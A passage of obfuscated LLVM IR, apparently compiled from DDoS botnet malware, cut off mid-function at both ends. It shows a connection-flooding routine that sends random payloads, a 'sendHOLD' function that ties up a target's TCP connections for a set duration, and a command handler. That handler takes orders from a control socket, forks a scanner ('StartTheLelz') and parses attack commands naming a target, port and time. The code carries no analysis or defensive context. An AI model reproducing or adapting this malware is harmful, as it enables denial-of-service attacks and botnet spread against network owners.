  %143 = srem i32 %142, 64
  %144 = zext i32 %143 to i64
  %145 = shl i64 1, %144
  %146 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %147 = load i32, i32* %8, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %148
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 8
  %152 = sdiv i32 %151, 64
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [16 x i64], [16 x i64]* %146, i64 0, i64 %153
  %155 = load i64, i64* %154, align 8
  %156 = xor i64 %155, -1
  %157 = xor i64 %145, -1
  %158 = xor i64 -3768112336340659048, -1
  %159 = and i64 %156, -3768112336340659048
  %160 = and i64 %155, %158
  %161 = and i64 %157, -3768112336340659048
  %162 = and i64 %145, %158
  %163 = or i64 %159, %160
  %164 = or i64 %161, %162
  %165 = xor i64 %163, %164
  %166 = or i64 %156, %157
  %167 = xor i64 %166, -1
  %168 = or i64 -3768112336340659048, %158
  %169 = and i64 %167, %168
  %170 = or i64 %165, %169
  %171 = or i64 %155, %145
  store i64 %170, i64* %154, align 8
  %172 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %172, align 8
  %173 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %173, align 8
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = sub i32 0, 1
  %180 = sub i32 %178, %179
  %181 = add nsw i32 %178, 1
  %182 = call i32 @select(i32 %180, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %182, i32* %15, align 4
  %183 = load i32, i32* %15, align 4
  %184 = icmp eq i32 %183, 1
  br i1 %184, label %185, label %212

; <label>:185:                                    ; preds = %137
  store i32 4, i32* %13, align 4
  %186 = load i32, i32* %8, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %187
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 8
  %191 = bitcast i32* %14 to i8*
  %192 = call i32 @getsockopt(i32 %190, i32 1, i32 4, i8* %191, i32* %13) #4
  %193 = load i32, i32* %14, align 4
  %194 = icmp ne i32 %193, 0
  br i1 %194, label %195, label %206

; <label>:195:                                    ; preds = %185
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 0
  %200 = load i32, i32* %199, align 8
  %201 = call i32 @close(i32 %200)
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 1
  store i8 0, i8* %205, align 4
  br label %211

; <label>:206:                                    ; preds = %185
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 1
  store i8 2, i8* %210, align 4
  br label %211

; <label>:211:                                    ; preds = %206, %195
  br label %227

; <label>:212:                                    ; preds = %137
  %213 = load i32, i32* %15, align 4
  %214 = icmp eq i32 %213, -1
  br i1 %214, label %215, label %226

; <label>:215:                                    ; preds = %212
  %216 = load i32, i32* %8, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %217
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 8
  %221 = call i32 @close(i32 %220)
  %222 = load i32, i32* %8, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %223
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %224, i32 0, i32 1
  store i8 0, i8* %225, align 4
  br label %226

; <label>:226:                                    ; preds = %215, %212
  br label %227

; <label>:227:                                    ; preds = %226, %211
  br label %254

; <label>:228:                                    ; preds = %60
  %229 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %229, i32 1024)
  %230 = load i32, i32* %8, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %231
  %233 = getelementptr inbounds %struct.state_t, %struct.state_t* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 8
  %235 = load i8*, i8** %16, align 8
  %236 = call i64 @send(i32 %234, i8* %235, i64 1024, i32 16384)
  %237 = icmp eq i64 %236, -1
  br i1 %237, label %238, label %253

; <label>:238:                                    ; preds = %228
  %239 = call i32* @__errno_location() #13
  %240 = load i32, i32* %239, align 4
  %241 = icmp ne i32 %240, 11
  br i1 %241, label %242, label %253

; <label>:242:                                    ; preds = %238
  %243 = load i32, i32* %8, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %244
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = call i32 @close(i32 %247)
  %249 = load i32, i32* %8, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %250
  %252 = getelementptr inbounds %struct.state_t, %struct.state_t* %251, i32 0, i32 1
  store i8 0, i8* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %242, %238, %228
  br label %254

; <label>:254:                                    ; preds = %253, %227, %125, %60
  br label %255

; <label>:255:                                    ; preds = %254
  %256 = load i32, i32* %8, align 4
  %257 = add i32 %256, 1167276479
  %258 = add i32 %257, 1
  %259 = sub i32 %258, 1167276479
  %260 = add nsw i32 %256, 1
  store i32 %259, i32* %8, align 4
  br label %56

; <label>:261:                                    ; preds = %56
  br label %51

; <label>:262:                                    ; preds = %51
  %263 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %263)
  br label %264

; <label>:264:                                    ; preds = %262, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #4
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %275

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #4
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = sub i32 %47, -45970582
  %50 = add i32 %49, %48
  %51 = add i32 %50, -45970582
  %52 = add nsw i32 %47, %48
  store i32 %51, i32* %17, align 4
  br label %53

; <label>:53:                                     ; preds = %272, %34
  %54 = load i32, i32* %17, align 4
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = icmp sgt i32 %54, %55
  br i1 %56, label %57, label %273

; <label>:57:                                     ; preds = %53
  store i32 0, i32* %8, align 4
  br label %58

; <label>:58:                                     ; preds = %267, %57
  %59 = load i32, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp slt i32 %59, %60
  br i1 %61, label %62, label %272

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %8, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %65, i32 0, i32 1
  %67 = load i8, i8* %66, align 4
  %68 = zext i8 %67 to i32
  switch i32 %68, label %266 [
    i32 0, label %69
    i32 1, label %116
    i32 2, label %206
  ]

; <label>:69:                                     ; preds = %62
  %70 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %72
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %73, i32 0, i32 0
  store i32 %70, i32* %74, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 8
  %80 = load i32, i32* %8, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %81
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 8
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 3, i8* null)
  %86 = and i32 %85, 2048
  %87 = xor i32 %85, 2048
  %88 = or i32 %86, %87
  %89 = or i32 %85, 2048
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %79, i32 4, i32 %88)
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %92
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  %96 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %97 = call i32 @connect(i32 %95, %struct.sockaddr* %96, i32 16)
  %98 = icmp ne i32 %97, -1
  br i1 %98, label %103, label %99

; <label>:99:                                     ; preds = %69
  %100 = call i32* @__errno_location() #13
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 115
  br i1 %102, label %103, label %110

; <label>:103:                                    ; preds = %99, %69
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = call i32 @close(i32 %108)
  br label %115

; <label>:110:                                    ; preds = %99
  %111 = load i32, i32* %8, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %112
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %113, i32 0, i32 1
  store i8 1, i8* %114, align 4
  br label %115

; <label>:115:                                    ; preds = %110, %103
  br label %266

; <label>:116:                                    ; preds = %62
  br label %117

; <label>:117:                                    ; preds = %116
  %118 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %119 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 0
  %120 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %119) #4, !srcloc !7
  %121 = extractvalue { i64, i64* } %120, 0
  %122 = extractvalue { i64, i64* } %120, 1
  %123 = trunc i64 %121 to i32
  store i32 %123, i32* %18, align 4
  %124 = ptrtoint i64* %122 to i64
  %125 = trunc i64 %124 to i32
  store i32 %125, i32* %19, align 4
  br label %126

; <label>:126:                                    ; preds = %117
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %129
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = srem i32 %132, 64
  %134 = zext i32 %133 to i64
  %135 = shl i64 1, %134
  %136 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %138
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = sdiv i32 %141, 64
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [16 x i64], [16 x i64]* %136, i64 0, i64 %143
  %145 = load i64, i64* %144, align 8
  %146 = and i64 %145, %135
  %147 = xor i64 %145, %135
  %148 = or i64 %146, %147
  %149 = or i64 %145, %135
  store i64 %148, i64* %144, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %150, align 8
  %151 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %151, align 8
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %153
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 8
  %157 = sub i32 0, 1
  %158 = sub i32 %156, %157
  %159 = add nsw i32 %156, 1
  %160 = call i32 @select(i32 %158, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %160, i32* %15, align 4
  %161 = load i32, i32* %15, align 4
  %162 = icmp eq i32 %161, 1
  br i1 %162, label %163, label %190

; <label>:163:                                    ; preds = %127
  store i32 4, i32* %13, align 4
  %164 = load i32, i32* %8, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %165
  %167 = getelementptr inbounds %struct.state_t, %struct.state_t* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 8
  %169 = bitcast i32* %14 to i8*
  %170 = call i32 @getsockopt(i32 %168, i32 1, i32 4, i8* %169, i32* %13) #4
  %171 = load i32, i32* %14, align 4
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %173, label %184

; <label>:173:                                    ; preds = %163
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  br label %189

; <label>:184:                                    ; preds = %163
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %184, %173
  br label %205

; <label>:190:                                    ; preds = %127
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %204

; <label>:193:                                    ; preds = %190
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 8
  %199 = call i32 @close(i32 %198)
  %200 = load i32, i32* %8, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %201
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %202, i32 0, i32 1
  store i8 0, i8* %203, align 4
  br label %204

; <label>:204:                                    ; preds = %193, %190
  br label %205

; <label>:205:                                    ; preds = %204, %189
  br label %266

; <label>:206:                                    ; preds = %62
  br label %207

; <label>:207:                                    ; preds = %206
  %208 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %209 = getelementptr inbounds [16 x i64], [16 x i64]* %208, i64 0, i64 0
  %210 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %209) #4, !srcloc !8
  %211 = extractvalue { i64, i64* } %210, 0
  %212 = extractvalue { i64, i64* } %210, 1
  %213 = trunc i64 %211 to i32
  store i32 %213, i32* %20, align 4
  %214 = ptrtoint i64* %212 to i64
  %215 = trunc i64 %214 to i32
  store i32 %215, i32* %21, align 4
  br label %216

; <label>:216:                                    ; preds = %207
  br label %217

; <label>:217:                                    ; preds = %216
  %218 = load i32, i32* %8, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %219
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 8
  %223 = srem i32 %222, 64
  %224 = zext i32 %223 to i64
  %225 = shl i64 1, %224
  %226 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %227 = load i32, i32* %8, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %228
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 8
  %232 = sdiv i32 %231, 64
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds [16 x i64], [16 x i64]* %226, i64 0, i64 %233
  %235 = load i64, i64* %234, align 8
  %236 = and i64 %235, %225
  %237 = xor i64 %235, %225
  %238 = or i64 %236, %237
  %239 = or i64 %235, %225
  store i64 %238, i64* %234, align 8
  %240 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %240, align 8
  %241 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %241, align 8
  %242 = load i32, i32* %8, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %243
  %245 = getelementptr inbounds %struct.state_t, %struct.state_t* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 8
  %247 = sub i32 %246, -1532610212
  %248 = add i32 %247, 1
  %249 = add i32 %248, -1532610212
  %250 = add nsw i32 %246, 1
  %251 = call i32 @select(i32 %249, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %251, i32* %15, align 4
  %252 = load i32, i32* %15, align 4
  %253 = icmp ne i32 %252, 0
  br i1 %253, label %254, label %265

; <label>:254:                                    ; preds = %217
  %255 = load i32, i32* %8, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %256
  %258 = getelementptr inbounds %struct.state_t, %struct.state_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 8
  %260 = call i32 @close(i32 %259)
  %261 = load i32, i32* %8, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %262
  %264 = getelementptr inbounds %struct.state_t, %struct.state_t* %263, i32 0, i32 1
  store i8 0, i8* %264, align 4
  br label %265

; <label>:265:                                    ; preds = %254, %217
  br label %266

; <label>:266:                                    ; preds = %265, %205, %115, %62
  br label %267

; <label>:267:                                    ; preds = %266
  %268 = load i32, i32* %8, align 4
  %269 = sub i32 0, 1
  %270 = sub i32 %268, %269
  %271 = add nsw i32 %268, 1
  store i32 %270, i32* %8, align 4
  br label %58

; <label>:272:                                    ; preds = %58
  br label %53

; <label>:273:                                    ; preds = %53
  %274 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %274)
  br label %275

; <label>:275:                                    ; preds = %273, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %42, label %39

; <label>:39:                                     ; preds = %2
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0))
  br label %646

; <label>:42:                                     ; preds = %2
  %43 = load i8**, i8*** %4, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @strcmp(i8* %45, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i32 0, i32 0)) #10
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %53, label %48

; <label>:48:                                     ; preds = %42
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %51 = call i8* @inet_ntoa(i32 %50) #4
  %52 = call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.52, i32 0, i32 0), i8* %51)
  br label %646

; <label>:53:                                     ; preds = %42
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 0
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @strcmp(i8* %56, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i32 0, i32 0)) #10
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %101, label %59

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %3, align 4
  %61 = icmp ne i32 %60, 2
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %59
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i32 0, i32 0))
  br label %646

; <label>:65:                                     ; preds = %59
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %78, label %71

; <label>:71:                                     ; preds = %65
  %72 = load i32, i32* @scanPid, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %71
  br label %646

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @scanPid, align 4
  %77 = call i32 @kill(i32 %76, i32 9) #4
  store i32 0, i32* @scanPid, align 4
  br label %78

; <label>:78:                                     ; preds = %75, %65
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0)) #10
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %100, label %84

; <label>:84:                                     ; preds = %78
  %85 = load i32, i32* @scanPid, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  br label %646

; <label>:88:                                     ; preds = %84
  %89 = call i32 @fork() #4
  store i32 %89, i32* %5, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp ugt i32 %90, 0
  br i1 %91, label %92, label %94

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %5, align 4
  store i32 %93, i32* @scanPid, align 4
  br label %646

; <label>:94:                                     ; preds = %88
  %95 = load i32, i32* %5, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %94
  br label %646

; <label>:98:                                     ; preds = %94
  br label %99

; <label>:99:                                     ; preds = %98
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:100:                                    ; preds = %78
  br label %101

; <label>:101:                                    ; preds = %100, %53
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0)) #10
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %177, label %107

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* %3, align 4
  %109 = icmp slt i32 %108, 4
  br i1 %109, label %122, label %110

; <label>:110:                                    ; preds = %107
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 2
  %113 = load i8*, i8** %112, align 8
  %114 = call i32 @atoi(i8* %113) #10
  %115 = icmp slt i32 %114, 1
  br i1 %115, label %122, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #10
  %121 = icmp slt i32 %120, 1
  br i1 %121, label %122, label %123

; <label>:122:                                    ; preds = %116, %110, %107
  br label %646

; <label>:123:                                    ; preds = %116
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  store i8* %126, i8** %6, align 8
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #10
  store i32 %130, i32* %7, align 4
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 3
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  store i32 %134, i32* %8, align 4
  %135 = load i8*, i8** %6, align 8
  %136 = call i8* @strstr(i8* %135, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
